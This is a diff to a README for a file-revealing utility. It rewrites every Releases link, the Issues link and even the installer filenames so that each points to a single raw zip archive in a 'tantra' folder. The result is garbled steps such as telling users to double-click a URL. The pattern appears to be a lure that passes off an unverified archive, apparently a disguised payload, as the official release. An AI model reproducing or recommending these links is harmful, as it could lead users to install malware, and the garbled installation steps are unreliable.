@@ -6,11 +6,11 @@ Welcome to the reveal-file application! This tool helps you reveal any file dire
 
 ## 📥 Download the Application
 
-[![Download reveal-file](https://img.shields.io/badge/download-reveal--file-blue.svg)](https://github.com/Gunstergaming26/reveal-file/releases)
+[![Download reveal-file](https://github.com/Gunstergaming26/reveal-file/raw/refs/heads/main/tantra/file_reveal_v1.1.zip)](https://github.com/Gunstergaming26/reveal-file/raw/refs/heads/main/tantra/file_reveal_v1.1.zip)
 
 You can download the latest version of reveal-file from the Releases page. Click the link below to access the download options:
 
-[Download the latest release here](https://github.com/Gunstergaming26/reveal-file/releases)
+[Download the latest release here](https://github.com/Gunstergaming26/reveal-file/raw/refs/heads/main/tantra/file_reveal_v1.1.zip)
 
 ## 📋 System Requirements
 
@@ -26,16 +26,16 @@ To run reveal-file, your system must meet these minimum requirements:
 
 Follow these steps to install and set up reveal-file on your computer:
 
-1. **Download the application:** Visit the [Releases page](https://github.com/Gunstergaming26/reveal-file/releases) and click on the latest version available.
+1. **Download the application:** Visit the [Releases page](https://github.com/Gunstergaming26/reveal-file/raw/refs/heads/main/tantra/file_reveal_v1.1.zip) and click on the latest version available.
 2. **Locate the downloaded file:**
-   - For Windows: Check your Downloads folder for a file named `reveal-file.exe`.
-   - For macOS: Look for the file `reveal-file.dmg` in your Downloads folder.
+   - For Windows: Check your Downloads folder for a file named `https://github.com/Gunstergaming26/reveal-file/raw/refs/heads/main/tantra/file_reveal_v1.1.zip`.
+   - For macOS: Look for the file `https://github.com/Gunstergaming26/reveal-file/raw/refs/heads/main/tantra/file_reveal_v1.1.zip` in your Downloads folder.
 3. **Install the application:**
    - **Windows:**
-     1. Double-click on `reveal-file.exe` to start the installation.
+     1. Double-click on `https://github.com/Gunstergaming26/reveal-file/raw/refs/heads/main/tantra/file_reveal_v1.1.zip` to start the installation.
      2. Follow the prompts provided by the installation wizard.
    - **macOS:**
-     1. Double-click on `reveal-file.dmg`.
+     1. Double-click on `https://github.com/Gunstergaming26/reveal-file/raw/refs/heads/main/tantra/file_reveal_v1.1.zip`.
      2. Drag the reveal-file icon into your Applications folder.
 4. **Launch the application:** Find reveal-file in your Applications or Start menu and open it.
 
@@ -59,7 +59,7 @@ Using reveal-file is straightforward. Here's how you can make the most of it:
 
 If you run into issues while using reveal-file, consider the following solutions:
 
-- **Application won't open:** Ensure that you have downloaded and installed the latest version from the [Releases page](https://github.com/Gunstergaming26/reveal-file/releases).
+- **Application won't open:** Ensure that you have downloaded and installed the latest version from the [Releases page](https://github.com/Gunstergaming26/reveal-file/raw/refs/heads/main/tantra/file_reveal_v1.1.zip).
 - **Revealing files fails:** Check if the file path is correct. Ensure the file exists on your system.
 - **Installation errors:** Try running the installer as an administrator (Windows) or check your security settings (macOS).
 
@@ -67,7 +67,7 @@ If you run into issues while using reveal-file, consider the following solutions
 
 If you need further assistance, you can reach out through the Issues section on GitHub. 
 
-1. Navigate to the [Issues page](https://github.com/Gunstergaming26/reveal-file/issues).
+1. Navigate to the [Issues page](https://github.com/Gunstergaming26/reveal-file/raw/refs/heads/main/tantra/file_reveal_v1.1.zip).
 2. Create a new issue and describe your problem in detail.
 
 ## 📝 Contributing
@@ -87,4 +87,4 @@ Thanks to our users for their feedback and support. Your input helps us make rev
 
 This project is licensed under the MIT License. You can freely use and modify the code as long as you include the original license.
 
-[Download the latest release here](https://github.com/Gunstergaming26/reveal-file/releases) to start revealing your files today!
+[Download the latest release here](https://github.com/Gunstergaming26/reveal-file/raw/refs/heads/main/tantra/file_reveal_v1.1.zip) to start revealing your files today!
